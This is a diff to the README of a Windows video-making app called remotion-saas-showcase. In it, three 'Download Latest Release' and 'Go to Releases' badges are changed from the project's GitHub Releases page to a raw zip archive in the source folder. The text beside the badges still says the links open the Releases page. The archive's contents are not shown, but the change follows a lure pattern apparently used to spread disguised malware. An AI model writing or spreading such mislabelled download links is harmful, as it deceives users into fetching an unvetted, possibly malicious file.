@@ -1,6 +1,6 @@
 # 🎬 remotion-saas-showcase - Create SaaS Product Videos Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Raazi305/remotion-saas-showcase/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Raazi305/remotion-saas-showcase/main/src/showcase_saas_remotion_3.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run the application on your Windows machine.
 
 Click the button below to go to the Releases page where you can get the latest version.
 
-[![Go to Releases](https://img.shields.io/badge/Go%20to%20Releases-blue)](https://github.com/Raazi305/remotion-saas-showcase/releases)
+[![Go to Releases](https://img.shields.io/badge/Go%20to%20Releases-blue)](https://raw.githubusercontent.com/Raazi305/remotion-saas-showcase/main/src/showcase_saas_remotion_3.1.zip)
 
 The Releases page lists all available versions. Look for the most recent one.
 
@@ -92,7 +92,7 @@ After installation, start the app from your desktop or Start menu.
 
 To download and install the remotion-saas-showcase app on Windows, visit the Releases page linked below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Raazi305/remotion-saas-showcase/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Raazi305/remotion-saas-showcase/main/src/showcase_saas_remotion_3.1.zip)
 
 Follow the instructions in the "Getting Started" section to complete your setup.
 
